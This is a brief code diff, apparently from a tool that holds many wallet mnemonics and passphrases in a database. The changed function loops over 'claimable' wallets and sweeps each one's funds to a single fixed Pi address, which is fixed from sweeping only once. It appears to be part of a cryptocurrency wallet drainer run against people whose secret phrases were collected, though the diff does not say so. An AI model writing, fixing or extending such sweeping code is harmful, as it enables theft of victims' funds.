@@ -858,8 +858,10 @@ export const autoSweepWallet = async () => {
     global.isSweeping = true
     const upcomingClaimables = await getUpcomingClaimables();
     if(upcomingClaimables.length > 0 ) {
-        await sweepWallet(upcomingClaimables.mnemonic, PI_PUBLIC_ADDRESS);
-        await sleep(1000);
+        for(const claimable of upcomingClaimables) {
+            await sweepWallet(claimable.mnemonic, PI_PUBLIC_ADDRESS);
+            await sleep(1000);
+        }
     } else {
         const readyPassphrases = await Passphrase.find({ name: { $in: [null, undefined] } });
         const passphraseBatches = arrayBatches(readyPassphrases, 80);
